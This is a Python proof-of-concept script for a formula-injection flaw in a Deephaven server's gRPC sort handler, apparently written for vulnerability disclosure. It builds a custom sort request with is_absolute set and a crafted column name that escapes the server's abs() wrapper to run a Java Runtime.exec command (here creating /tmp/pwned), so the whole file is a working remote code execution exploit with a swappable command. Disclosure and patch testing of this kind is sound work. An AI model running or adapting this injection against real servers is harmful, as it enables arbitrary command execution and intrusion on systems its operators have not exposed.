"""
PoC for Gap 5: SortTableGrpcImpl absolute sort column name injection.

When is_absolute=True, the server interpolates the column name into a formula:
    abs(<column_name>)
via AbsoluteSortColumnConventions.makeSelectable(), then applies it as an updateView
BEFORE the sort itself is attempted. This means arbitrary code in the column name
executes even though the sort will ultimately fail.

Preconditions:
  - A Deephaven server running on localhost:10000
  - A table "t" exists in the global scope (e.g. from t = emptyTable(1).update("i = 1"))
"""

from pydeephaven import Session
from pydeephaven._table_ops import SortOp, SortDirection
from deephaven_core.proto import table_pb2, table_pb2_grpc, ticket_pb2
from typing import Any, Optional


class AbsoluteSortOp(SortOp):
    """A SortOp that sets is_absolute=True on every sort descriptor,
    which the normal client API never does."""

    def make_grpc_request(
        self,
        result_id: Optional[ticket_pb2.Ticket],
        source_id: Optional[table_pb2.TableReference],
    ) -> Any:
        sort_descriptors = []
        for col in self.column_names:
            sort_descriptors.append(
                table_pb2.SortDescriptor(
                    column_name=col,
                    is_absolute=True,
                    direction=table_pb2.SortDescriptor.ASCENDING,
                )
            )
        return table_pb2.SortTableRequest(
            result_id=result_id, source_id=source_id, sorts=sort_descriptors
        )


# The injected column name. The server builds:
#   abs(<column_name>)
# so this becomes:
#   abs(1) + Runtime.getRuntime().exec("touch /tmp/pwned").hashCode() + abs(1)
# hashCode() returns int, so the full expression is numeric and compiles.
# The file /tmp/pwned is created as a side effect during formula evaluation.
PAYLOAD = '1) + Runtime.getRuntime().exec("touch /tmp/pwned").hashCode() + abs(1'


def main():
    session = Session(host="localhost", port=10000)
    try:
        t = session.open_table("t")
        print(f"Opened table 't', size={t.size}")

        op = AbsoluteSortOp(column_names=[PAYLOAD], directions=[SortDirection.ASCENDING])
        try:
            result = t.table_op_handler(op)
            print(f"Sort unexpectedly succeeded, result size={result.size}")
        except Exception as e:
            print(f"Sort failed as expected: {e}")

        print()
        print("Check: does /tmp/pwned exist?")
        print("  ls -la /tmp/pwned")
    finally:
        session.close()


if __name__ == "__main__":
    main()

